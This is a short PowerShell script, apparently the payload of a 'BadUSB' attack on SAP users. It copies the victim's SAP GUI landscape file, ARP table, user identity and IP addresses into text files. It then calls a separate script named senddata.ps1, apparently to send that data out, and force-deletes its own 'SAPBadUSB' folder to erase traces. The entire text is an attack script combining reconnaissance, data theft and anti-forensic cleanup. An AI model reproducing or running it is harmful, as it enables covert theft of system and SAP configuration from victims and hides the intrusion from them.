Get-Content $env:APPDATA\SAP\Common\SAPUILandscape.xml > landscape.txt
arp -a > arptable.txt
whoami > whoami.txt
Get-NetIPAddress > ipaddress.txt
.\senddata.ps1
cd ..\..
Get-ChildItem -Path "SAPBadUSB" -Recurse -Confirm:$false | Remove-Item -force -recurse -Confirm:$false
Remove-Item "SAPBadUSB" -Force -Confirm:$false